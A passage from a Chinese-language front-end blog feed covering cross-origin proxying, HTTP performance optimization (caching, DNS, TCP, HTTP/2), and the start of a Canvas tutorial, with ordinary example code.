class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  devServer: &#123;</span><br><span class="line">    port: <span class="string">&#x27;3000&#x27;</span>,</span><br><span class="line">    compress: <span class="literal">true</span>,</span><br><span class="line">    open: <span class="literal">true</span>,</span><br><span class="line">    hot: <span class="literal">true</span>,</span><br><span class="line">    proxy: &#123;</span><br><span class="line">      <span class="string">&#x27;/&#x27;</span>: &#123;</span><br><span class="line">        target: <span class="string">&#x27;https://www.jianshu.com&#x27;</span>,</span><br><span class="line">        changeOrigin: <span class="literal">true</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通过代理爬取简书"><a href="#通过代理爬取简书" class="headerlink" title="通过代理爬取简书"></a>通过代理爬取简书</h3><ul><li>通过 pipe 实现请求代理</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> request = <span class="built_in">require</span>(<span class="string">&#x27;request&#x27;</span>)</span><br><span class="line">app.get(<span class="string">&#x27;/subscriptions/recommended_collections&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> url = <span class="string">&#x27;https://www.jianshu.com/asimov&#x27;</span> + req.url</span><br><span class="line">  req.pipe(request(url)).pipe(res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意：这里html文件名必须为index.html</span></span><br><span class="line">app.use(express.static(<span class="string">&#x27;./&#x27;</span>))</span><br></pre></td></tr></table></figure><ul><li>前端代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  fetch(<span class="string">&#x27;/subscriptions/recommended_collections&#x27;</span>).then(<span class="function"><span class="params">response</span> =&gt;</span> response.text()).then(<span class="function"><span class="params">data</span> =&gt;</span> <span class="built_in">console</span>.log(</span></span><br><span class="line">    data))</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;跨域&quot;&gt;&lt;a href=&quot;#跨域&quot; class=&quot;headerlink&quot; title=&quot;跨域&quot;&gt;&lt;/a&gt;跨域&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;非同源策略请求&lt;/strong&gt;（比较协议、域名、端口号，只要有一个不一样就是跨域）：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;页面的访问地址（Web地址）&lt;/li&gt;
&lt;li&gt;数据接口的请求地址&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="JavaScript" scheme="http://llmysnow.top/categories/JavaScript/"/>
    
    
    <category term="JavaScript" scheme="http://llmysnow.top/tags/JavaScript/"/>
    
    <category term="JSONP" scheme="http://llmysnow.top/tags/JSONP/"/>
    
    <category term="CORS" scheme="http://llmysnow.top/tags/CORS/"/>
    
    <category term="Proxy" scheme="http://llmysnow.top/tags/Proxy/"/>
    
  </entry>
  
  <entry>
    <title>HTTP网络层性能优化</title>
    <link href="http://llmysnow.top/posts/2623edef/"/>
    <id>http://llmysnow.top/posts/2623edef/</id>
    <published>2021-05-24T07:48:01.285Z</published>
    <updated>2021-05-26T01:29:13.551Z</updated>
    
    <content type="html"><![CDATA[<h2 id="客户端和服务端之间的信息通信"><a href="#客户端和服务端之间的信息通信" class="headerlink" title="客户端和服务端之间的信息通信"></a>客户端和服务端之间的信息通信</h2><ul><li>ajax / fetch 数据交互</li><li>跨域处理方案：ajax、fetch、jsonp、postMessage</li><li>资源获取【html|、css、js、image、音视频】</li><li>webscoket</li></ul><a id="more"></a><p>请求：客户端把信息传递给服务器或者向服务器发送请求</p><p>响应：服务器接受客户端信息并且返回给客户端相关的内容</p><p>HTTP 报文：客户端和服务器之间的传输的所有内容</p><ul><li><p>起始行：基本信息【包含 HTTP 的版本等】</p><p>请求起始行：GET【请求方式】 xxx【请求地址】 HTTP/1.1【HTTP 版本号】</p><p>响应起始行：HTTP/1.1【HTTP 版本】 200【HTTP 响应状态码】 OK【状态码描述】</p></li><li><p>首部（头）：请求头【客户端-&gt;服务器】、响应头【服务器-&gt;客户端】</p></li><li><p>主体：请求主体【客户端-&gt;服务器】、响应主体【服务器-&gt;客户端】</p></li></ul><p>客户端和服务器之间的数据传输，依托于网络【通信模式 TCP/IP… 传输协议 HTTP/HTTPS/FTP…】</p><h2 id="从输入-URL-地址到看到页面，中间的经历"><a href="#从输入-URL-地址到看到页面，中间的经历" class="headerlink" title="从输入 URL 地址到看到页面，中间的经历"></a>从输入 URL 地址到看到页面，中间的经历</h2><ol><li>URL 解析</li><li>检查缓存【强缓存、协商缓存（针对资源文件请求）；本地缓存（针对数据请求）】</li><li>DNS 服务器解析【域名解析：根据域名解析出服务器外网 IP】</li><li>TCP 三次握手【建立客户端和服务器之间的网络连接通道】</li><li>基于 HTTP/HTTPS 等协议，实现客户端和服务端之间的信息通信</li><li>TCP 四次挥手【把建立好的网络通道释放掉】</li><li>客户端渲染【呈现出页面和效果】</li></ol><h3 id="URL-解析"><a href="#URL-解析" class="headerlink" title="URL 解析"></a>URL 解析</h3><p><img data-src="https://gitee.com/lilyn/pic/raw/master/js-img/URL%E8%A7%A3%E6%9E%90.jpg" alt="URL解析"></p><p>URI：统一资源标识符</p><ul><li>URL：统一资源定位符</li><li>URN：统一资源名称</li></ul><p><strong>传输协议：</strong>用什么样的协议负责客户端和服务端的信息传输</p><ul><li><p>HTTP：超文本传输协议</p><p>除了传输文本还可以传输其余的信息，例如：文件流、二进制或者 Buffer 格式或者 BASE64 格式的数据</p></li><li><p>HTTPS：HTTP + SSL（TSL） 更安全的 HTTP，传输的内容经过加密</p></li><li><p>FTP：文件的上传下载</p></li></ul><p><strong>域名：</strong>对服务器外网 IP 的一个重命名</p><p><code>www.baidu.com</code></p><ul><li>顶级域名 <code>baidu.com</code></li><li>一级域名 <code>www.baidu.com</code></li><li>二级域名 <code>video.baidu.com</code></li><li>三级域名 <code>image.video.baidu.com</code></li></ul><p>域名和服务器购买完后，需要在 DNS 服务器生成一条解析记录，用于以后的 DNS 解析</p><p><strong>端口号：</strong>区分同一台服务器上不同的服务的</p><ul><li><p>取值范围：0~65535 之间</p></li><li><p>默认端口号：浏览器会根据输入的协议，给与默认端口号</p><p>HTTP -&gt; 80</p><p>HTTPS -&gt; 443</p><p>FTP -&gt; 21</p></li></ul><p><strong>请求资源的路径名称：</strong>基于路径找到客户端需要的资源文件</p><p>看到的 URL 地址可能是重写后的【看到的地址在文件目录不存在】</p><ul><li><p>ajax 数据请求 <code>/api/list</code></p></li><li><p>url 重写</p><p>动态网址，页面中的内容是无法被搜索引擎收录的（不利于 SEO 优化）</p><p>静态化地址 <code>https://item.jd.com/....</code>，通过 URL 重写为 <code>https://item.jd.com/detail.jsp?id=...</code></p><p><code>https://item.jd.com/info/100000</code> 路径参数【导航】</p><p><code>https://www.baidu.com/info?id=100000</code></p></li></ul><p><strong>问号传参：</strong></p><ul><li><p>把信息参数传递给服务器，GET 系列请求一般都是这样传递参数</p><p><code>xxx=xxx&amp;xxx=xxx</code> -&gt; x-www-form-urlencoded 格式</p></li><li><p>如果是页面跳转，把信息传递给另一个页面</p></li></ul><p><strong>HASH 值：</strong></p><ul><li>锚点定位</li><li>HASH 路由</li></ul><p>URL 编译问题：</p><ul><li>encodeURI decodeURI：编译空格和中文，一般编译整个 URL 中的信息（前后端都支持的 API）</li><li>encodeURIComponent decodeURIComponent：编译空格和中文以及一些特殊符号，所以一般只用来编译传递的信息的值，而不是整个 URL（前后端都支持的 API）</li><li>escape unescape（用于客户端页面信息传递或一些信息的编译【cookie 中的中文内容编译】）</li><li>也可以基于自己设定的加密机制规则处理（对称加密）</li><li>对于某些数据，需要采用不可解密的（非对称加密），例如：md5</li></ul><h3 id="缓存检测"><a href="#缓存检测" class="headerlink" title="缓存检测"></a>缓存检测</h3><p><strong>缓存处理是基于 HTTP 网络层进行优化的一个非常重要的手段</strong>【针对资源文件请求】</p><p>强缓存还是协商缓存都是服务器设置的，客户端浏览器自己会根据返回的一些信息，进行相关处理，无需前端单独设置东西</p><p><strong>缓存位置：</strong></p><ul><li>Memory Cache : 内存缓存（页面没有关闭，只是刷新）</li><li>Disk Cache：硬盘缓存（页面关闭后重新打开）</li></ul><p>打开网页：查找硬盘缓存中是否有匹配，如有则使用，如没有则发送网络请求</p><p>普通刷新（F5）：因 TAB 没关闭，因此内存缓存是可用的，会被优先使用，其次才是硬盘缓存</p><p>强制刷新（Ctrl + F5）：浏览器不使用缓存，因此发送的请求头均带有 <code>Cache-Control: no-cache</code>，服务器直接返回 200 和最新内容</p><p><strong>强缓存：</strong> <code>Expires / Cache-Control</code></p><blockquote><p>Expires：缓存过期时间，用来指定资源到期的事件（HTTP/1.0）</p><p>Cache-Control：<code>cache-control: public, max-age=2592000</code> 第一次拿到资源后的 2592000 秒内（30 天），再次发生请求，读取缓存中的信息（HTTP/1.1）</p></blockquote><ul><li>如果获取的是强缓存信息，HTTP 状态码是 <strong>200</strong></li><li>如果是从服务器成功重新获取，HTTP 状态码也是 <strong>200</strong></li></ul><p>问题：本地缓存了文件，但是服务对应的资源文件更新了，如何保证获取的是最新的内容？</p><ol><li>所有请求的资源文件（css / js / 图片）后面都带一个时间戳</li><li>每一次资源的更新，基于 webpack 生成不同的资源名称（HASH 值）</li></ol><p>所以 HTML 永远不会做强缓存，资源文件一般会使用 强缓存+协商缓存</p><p><strong>协商缓存：</strong> <code>Last-Modified / ETag</code></p><blockquote><p>Last-Modified：记录服务器资源文件最后一次更新的时间（HTTP/1.0）请求头： <code>If-Modified-Since</code></p><p>ETag：只要服务器资源文件改变，会生成一个不同的标识（HTTP/1.1）请求头： <code>If-None-Match</code></p></blockquote><p>当强缓存失效（不存在）【html 可以做协商缓存】，会校验协商缓存，每一次都会向服务器校验资源是否更新</p><ul><li>如果没有更新，返回 <strong>304</strong> 通知客户端读取缓存信息，从本地缓存中获取内容进行渲染</li><li>如果有更新，返回 <strong>200</strong> 及最新资源信息，直接渲染，并把最新的 Last-Modified / ETag 和最新的资源信息缓存到本地</li></ul><p><strong>数据缓存：</strong></p><p>没有缓存数据，从服务器拉取最新数据；有缓存数据，直接读取缓存数据【减少和服务器之间的交互频率，降低服务器压力，也可以提高页面的渲染速度】</p><ul><li>页面不刷新，某些内容频繁操作，但是数据不是需要实时更新，可以做缓存【不经常更新的数据】</li><li>页面只要不关闭，直接读取缓存，如果页面关闭，重新打开我们也可以读取缓存中的数据【数据更新频率更低，可以设置过期时间】</li></ul><p>客户端存储数据的方案：</p><ol><li>（全局）变量存储【vuex / redux】：页面刷新或关闭后打开，之前存储的数据都没有（内存释放）</li><li>cookie</li><li>webStorage：LocalStorage SessionStorage</li><li>IndexedDB 浏览器数据库存储</li><li>Cache</li><li>Manifest 离线存储</li></ol><p><strong>LocalStorage V.S. SessionStorage</strong></p><ul><li>LocalStorage 持久化本地存储（没有过期时间），页面关闭存储内容也是存在的，除非用户手动清除 <code>removeItem clear</code></li><li>SessionStorage 会话存储，页面关闭后，存储的信息会消息【页面刷新不消失】</li></ul><p><strong>Cookie V.S. LocalStorage</strong></p><ul><li><p>Cookie 只允许一个源下最多存储 4KB 内容，所以不能存储太多的数据</p><p>本地存储的数据是由同源访问限制的，只允许读取本源下存储的内容</p></li><li><p>LocalStorage 可以在同源下存储 5MB 内容</p><br></li><li><p>Cookie 需要设置过期时间，超过时间就失效，并且有路径限制</p></li><li><p>LocalStorage 持久化存储，没有过期时间，除非手动清除</p><br></li><li><p>Cookie 不稳定</p><p>基于安全卫士或浏览器自带的清除操作，会把 Cookie 删除掉，开启无痕浏览，不能存储 Cookie</p></li><li><p>LocalStorage 不受这些操作影响</p><br></li><li><p>Cookie 兼容低版本浏览器</p></li><li><p>LocalStorage HTML5 新增的 API【不兼容 IE8 以下浏览器】</p><br></li><li><p>Cookie 不算严格本地存储</p><p>客户端向服务器发送请求，会默认把本地的 Cookie 基于请求头发送给服务器，并且服务器返回的响应头中有 Set-Cookie 字段，浏览器会默认把这些信息种在客户端本地中</p></li><li><p>LocalStorage 严格本地存储，默认情况下和服务器没有任何关系</p></li></ul><p>想要基于 ajax 获取数据，必须要保证当前页面的运行是在 http/https 协议下，file 文件协议不行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">    xhr.open(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;./data.json&#x27;</span>)</span><br><span class="line">    xhr.onreadystatechange = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (xhr.status === <span class="number">200</span> &amp;&amp; xhr.readyState === <span class="number">4</span>) &#123;</span><br><span class="line">        resolve(<span class="built_in">JSON</span>.parse(xhr.responseText))</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.send()</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">;(<span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> cache_data = <span class="built_in">localStorage</span>.getItem(<span class="string">&#x27;cache-data&#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span> (cache_data) &#123;</span><br><span class="line">    cache_data = <span class="built_in">JSON</span>.parse(cache_data)</span><br><span class="line">    <span class="keyword">if</span> (+<span class="keyword">new</span> <span class="built_in">Date</span>() - cache_data.time &lt;= <span class="number">10000</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="keyword">await</span> getData()</span><br><span class="line">  <span class="built_in">localStorage</span>.setItem(</span><br><span class="line">    <span class="string">&#x27;cache-data&#x27;</span>,</span><br><span class="line">    <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">      time: +<span class="keyword">new</span> <span class="built_in">Date</span>(),</span><br><span class="line">      data: result,</span><br><span class="line">    &#125;)</span><br><span class="line">  )</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><h3 id="DNS-解析"><a href="#DNS-解析" class="headerlink" title="DNS 解析"></a>DNS 解析</h3><ul><li>递归查询</li></ul><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/DNS%E8%A7%A3%E6%9E%90-%E9%80%92%E5%BD%92%E6%9F%A5%E8%AF%A2.jpg"></p><ul><li>迭代查询</li></ul><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/DNS%E8%A7%A3%E6%9E%90-%E8%BF%AD%E4%BB%A3%E6%9F%A5%E8%AF%A2.jpg"></p><p>多服务器部署</p><ul><li>弊端：增加了 DNS 解析次数</li><li>优势：资源合理利用、抗压能力增强、提高 HTTP 并发性【同源并发 HTTP 5~7 个】</li></ul><p>每一次 DNS 解析时间预计在 20~120 毫秒</p><ul><li>减少 DNS 请求次数</li><li>DNS 预获取（DNS Prefetch）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;x-dns-prefetch-control&quot;</span> content=<span class="string">&quot;on&quot;</span>&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;dns-prefetch&quot;</span> href=<span class="string">&quot;//static.360buyimg.com&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><h3 id="TCP-三次握手"><a href="#TCP-三次握手" class="headerlink" title="TCP 三次握手"></a>TCP 三次握手</h3><ul><li>seq 序号，用来标识从 TCP 源端向目的端发送的字节流，发起方发送数据时对此进行标记</li><li>ack 确认序号，只有 ACK 标识为 1 时，确认序号字段才有效，ack=seq+1</li><li>标识位<ul><li>ACK：确认序号有效（acknowledge）</li><li>RST：重置连接 （reset）</li><li>SYN：发起一个新连接（synchronous）</li><li>FIN：释放一个新连接（finish）</li><li>seq：序号（sequence）</li></ul></li></ul><p><img data-src="https://img-blog.csdnimg.cn/20200430211404285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg5Mzk1,size_16,color_FFFFFF,t_70#pic_center" alt="三次握手"></p><p>TCP 三次握手通俗理解，C→S：在不在，S→C：我在你在不在，C→S：我在</p><p><strong>三次握手为什么不用两次或四次？</strong></p><ul><li>TCP 作为一种可靠传输控制协议，其核心思想：<strong>既要保证数据可靠传输，又要提高传输的效率</strong></li><li>两次握手只能保证客户端给服务器端的信息收到了，不能保证服务端给客户端的信息收到了（不够稳定）</li><li>四次握手就多余了，因为服务端已经知道客户端收到信息了，再给客户端发信息就没有意义了</li></ul><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/OSI%20TCP.png"></p><p>UDP(User Datagram Protocol) 连接没有三次握手机制</p><ol><li>相对于 TCP 来讲快</li><li>不稳定可靠</li></ol><h3 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h3><p>HTTP 报文</p><ul><li>请求报文</li><li>响应报文</li></ul><p>响应状态码</p><ul><li>200 OK：请求已成功</li><li>202 Accepted：服务器已接受请求，但尚未处理（异步）</li><li>204 No Content：服务器成功处理了请求，但不需要返回任何实体内容</li><li>301 Moved Permanently：永久重定向</li><li>302 Move Temporarily：临时重定向</li><li>304 Not Modified：文档内容没有改变，走协商缓存</li><li>400 Bad Request : 请求参数有误</li><li>401 Unauthorized：请求需要权限验证</li><li>404 Not Found：请求失败，服务器没有这个资源</li><li>405 Method Not Allowed：请求方法不能由于请求相应资源</li><li>500 Internal Server Error：服务器未知错误</li><li>502 Bad Gateway：网关有误</li><li>503 Service Unavailable：服务器维护或过载，无法处理请求</li></ul><h3 id="TCP-四次挥手"><a href="#TCP-四次挥手" class="headerlink" title="TCP 四次挥手"></a>TCP 四次挥手</h3><p>服务受到信息和标识后</p><ol><li>准备客户端需要的东西【需要时间】</li><li>把信息返回给客户端</li></ol><p>但是为了保证消息的及时反馈，此时需要立即告诉客户端：我收到你的东西了，我现在开始准备等我一会</p><p><img data-src="https://img-blog.csdnimg.cn/20200430211431423.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg5Mzk1,size_16,color_FFFFFF,t_70#pic_center" alt="四次握手"></p><p>TCP 四次挥手通俗理解，C→S：我要走了，S→C：等下，我看看还有没有数据要传输，C→S：好了，没事了，挂了吧（已经挂了），C→S：挂了</p><p><strong>为什么连接的时候是三次握手，关闭的时候却是四次挥手？</strong></p><ul><li>服务端收到客户端的 SYN 连接请求，可以直接发送 SYN+ACK 报文</li><li>但关闭连接时，当服务器收到 FIN 报文时，很可能并不会立即关闭连接，所以只能先回复以一个 ACK 报文，告诉客户端：你发的 FIN 报文我收到了，只有等到服务端所有的报文都发送完了，才能发送 FIN 报文，因此不能一起发送，故需要四次握手</li></ul><p><strong>为了减少 TCP 握手和挥手的时间，一般都使用 <code>Connection: keep-alive</code></strong></p><p>数据请求：</p><ul><li>长轮询：设置定时器，每隔多久发送一次请求，拿到最新数据</li><li>长连接：如果数据没有更新则连接不中断（服务器挂起），监听数据改变</li></ul><h3 id="页面渲染"><a href="#页面渲染" class="headerlink" title="页面渲染"></a>页面渲染</h3><h2 id="性能优化汇总"><a href="#性能优化汇总" class="headerlink" title="性能优化汇总"></a>性能优化汇总</h2><ol><li><p>利用缓存</p><ul><li>对于静态资源文件实现强缓存和协商缓存（扩展：文件有更新，如何保证及时刷新？）</li><li>对于不经常更新的接口数据采用本地存储做数据缓存（扩展：cookie / localStorage / vuex|redux 区别？）</li></ul></li><li><p>DNS 优化</p><ul><li>分服务器部署，增加 HTTP 并发性（导致 DNS 解析变慢）</li><li>DNS Prefetch</li></ul></li><li><p>TCP 的三次握手和四次挥手</p><ul><li>Connection: keep-alive</li></ul></li><li><p>数据传输</p><ul><li><p>减少数据传输的大小</p><p>内容或者数据压缩（webpack 等）</p><p>服务器端一定要开启 GZIP 压缩（一般能压缩 60%左右）</p><p>大批量数据分批次请求（例如：下拉刷新或者分页，保证首次加载请求数据少）</p></li><li><p>减少 HTTP 请求的次数</p><p>资源文件合并处理</p><p>字体图标</p><p>雪碧图 CSS-Sprit</p><p>图片的 BASE64</p></li></ul></li><li><p>CDN 服务器“地域分布式“</p></li><li><p>采用 HTTP2.0</p></li></ol><p>网络优化是前端性能优化的中的重点内容，因为大部分的消耗都发生在网络层，尤其是第一次页面加载，如何减少等待时间很重要“减少白屏的效果和时间”</p><ul><li>loading 人性化体验</li><li>骨架屏：客户端骨屏 + 服务器骨架屏</li><li>图片延迟加载</li></ul><h2 id="HTTP1-0-VS-HTTP1-1-VS-HTTP2-0"><a href="#HTTP1-0-VS-HTTP1-1-VS-HTTP2-0" class="headerlink" title="HTTP1.0 VS HTTP1.1 VS HTTP2.0"></a>HTTP1.0 VS HTTP1.1 VS HTTP2.0</h2><h3 id="HTTP1-0-VS-HTTP1-1-区别："><a href="#HTTP1-0-VS-HTTP1-1-区别：" class="headerlink" title="HTTP1.0 VS HTTP1.1 区别："></a>HTTP1.0 VS HTTP1.1 区别：</h3><ul><li><strong>缓存处理：</strong>HTTP1.0 中主要使用 Last-Modified、Expires 来做缓存判断标准，HTTP1.1 则引入了更多的缓存控制策略：ETag、Cache-Control…</li><li><strong>带宽优化及网络连接的使用：</strong>HTTP1.1 支持断点续传，即返回码是 206（Partial Content）</li><li><strong>长连接：</strong>HTTP1.1 中默认开启 <code>Connection: keep-alive</code>，一定程度上弥补了 HTTP1.0 每次请求都要创建连接的缺点</li><li><strong>错误通知的管理：</strong>在 HTTP1.1 中新增了 24 个错误状态响应码，如 409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除…</li><li><strong>Host 头处理：</strong>在 HTTP1.0 中认为每台服务器都绑定一个唯一的 IP 地址，因此，请求消息中的 URL 并没有传递主机名（hostname）。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个 IP 地址。HTTP1.1 的请求消息和响应消息都应支持 Host 头域，且请求消息中如果没有 Host 头域会报告一个错误（400 Bad Request）</li></ul><h3 id="HTTP2-0-VS-HTTP1-x-的新特性："><a href="#HTTP2-0-VS-HTTP1-x-的新特性：" class="headerlink" title="HTTP2.0 VS HTTP1.x 的新特性："></a>HTTP2.0 VS HTTP1.x 的新特性：</h3><ul><li><p><strong>新的二进制格式（Binary Format）：</strong>HTTP1.x 的解析是基于文本，基于文本协议的格式解析存在天然缺陷，文本的表现形式有多样性，要做到健壮性考虑的场景必然很多，二进制则不同，只认 0 和 1 的组合，基于这种考虑 HTTP2.0 的协议解析决定采用二进制格式，实现方便且健壮</p></li><li><p><strong>header 压缩：</strong>HTTP1.x 的 header 带有大量信息，而且每次都要重复发送，HTTP2.0 使用 encoder 来减少需要传输的 header 大小，通讯双方各自 cache 一份 header fields 表，既避免了重复 header 的传输，又减小了需要传输的大小</p></li><li><p><strong>服务端推送（server push）：</strong>例如我的网页有一个 sytle.css 的请求，在客户端收到 sytle.css 数据的同时，服务端会将 sytle.js 的文件推送给客户端，当客户端再次尝试获取 sytle.js 时就可以直接从缓存中获取到，不用再发请求了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Link: <span class="tag">&lt;/<span class="name">styles.css</span>&gt;</span>; rel=preload; as=style, <span class="tag">&lt;/<span class="name">example.png</span>&gt;</span>; rel=preload; as=image</span><br></pre></td></tr></table></figure></li><li><p><strong>多路复用（MultiPlexing）</strong></p><p>HTTP/1.0 每次请求响应，建立一个 TCP 连接，用完关闭</p><p>HTTP/1.1 「长连接」 若干个请求排队串行化单线程处理，后面的请求等待前面请求的返回才能获得执行机会，一旦有某请求超时等，后续请求只能被阻塞，毫无办法，也就是人们常说的线头阻塞；</p><p>HTTP/2.0 「多路复用」多个请求可同时在一个连接上并行执行，某个请求任务耗时严重，不会影响到其它连接的正常执行；</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;客户端和服务端之间的信息通信&quot;&gt;&lt;a href=&quot;#客户端和服务端之间的信息通信&quot; class=&quot;headerlink&quot; title=&quot;客户端和服务端之间的信息通信&quot;&gt;&lt;/a&gt;客户端和服务端之间的信息通信&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;ajax / fetch 数据交互&lt;/li&gt;
&lt;li&gt;跨域处理方案：ajax、fetch、jsonp、postMessage&lt;/li&gt;
&lt;li&gt;资源获取【html|、css、js、image、音视频】&lt;/li&gt;
&lt;li&gt;webscoket&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="网络" scheme="http://llmysnow.top/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="性能优化" scheme="http://llmysnow.top/tags/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
    
    <category term="HTTP网络层" scheme="http://llmysnow.top/tags/HTTP%E7%BD%91%E7%BB%9C%E5%B1%82/"/>
    
  </entry>
  
  <entry>
    <title>Canvas 学习（时钟 绘图板）</title>
    <link href="http://llmysnow.top/posts/453bf97e/"/>
    <id>http://llmysnow.top/posts/453bf97e/</id>
    <published>2021-05-23T05:43:16.145Z</published>
    <updated>2021-05-26T01:29:13.543Z</updated>
    
    <content type="html"><![CDATA[<h2 id="canvas画圆"><a href="#canvas画圆" class="headerlink" title="canvas画圆"></a>canvas画圆</h2><ul><li>为什么需要用canvas，如果用<code>onmousemove</code>，每一次移动都会进行DOM重绘，非常消耗性能，这时我们需要看一下 canvas</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;canvas&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    canvas.onmousemove = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> div = <span class="built_in">document</span>.createElement(<span class="string">&quot;div&quot;</span>);</span></span><br><span class="line"><span class="javascript">        div.style.position = <span class="string">&quot;absolute&quot;</span>;</span></span><br><span class="line"><span class="javascript">        div.style.left = e.clientX + <span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="javascript">        div.style.top = e.clientY + <span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="javascript">        div.style.width = <span class="string">&quot;6px&quot;</span>;</span></span><br><span class="line"><span class="javascript">        div.style.height = <span class="string">&quot;6px&quot;</span>;</span></span><br><span class="line"><span class="javascript">        div.style.marginLeft = <span class="string">&quot;-3px&quot;</span>;</span></span><br><span class="line"><span class="javascript">        div.style.marginRight = <span class="string">&quot;-3px&quot;</span>;</span></span><br><span class="line"><span class="javascript">        div.style.borderRadius = <span class="string">&quot;50%&quot;</span>;</span></span><br><span class="line"><span class="javascript">        div.style.backgroundColor = <span class="string">&quot;black&quot;</span>;</span></span><br><span class="line">        canvas.appendChild(div);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>我们现在已经给 canvas 设置一屏宽高，但还是出现滚动条，原因是 canvas 是 inline 元素，设置宽高不起作用，所以需要把它转换成块级元素（<strong>不要这样做，这样做会拉伸元素</strong>）</li></ul><figure class="highlight html"><table><tr><td 